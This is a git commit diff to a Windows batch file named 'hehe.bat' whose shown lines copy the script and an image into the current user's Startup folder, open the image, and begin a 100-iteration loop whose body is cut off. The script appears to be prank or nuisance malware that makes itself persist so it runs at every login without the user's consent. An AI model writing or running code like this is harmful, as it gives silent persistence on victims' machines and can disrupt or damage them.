b38c981e5cf80a86c4e723a7e9d4b82b7324b085
terrortoon <81480921+terrortoon@users.noreply.github.com>
2024-02-18 22:14:34 +0100

    Update hehe.bat

--- hehe.bat
+++ hehe.bat
@@ -1,7 +1,10 @@
 @echo off
 Xcopy /I /Y .\hehe.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
 Xcopy /I /Y .\hehe.jpg "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
 hehe.jpg
+
 set rmcolon=%time::=%
 set rmcomma=%rmcolon:,=%
 FOR /L %%A IN (1,1,100) DO (
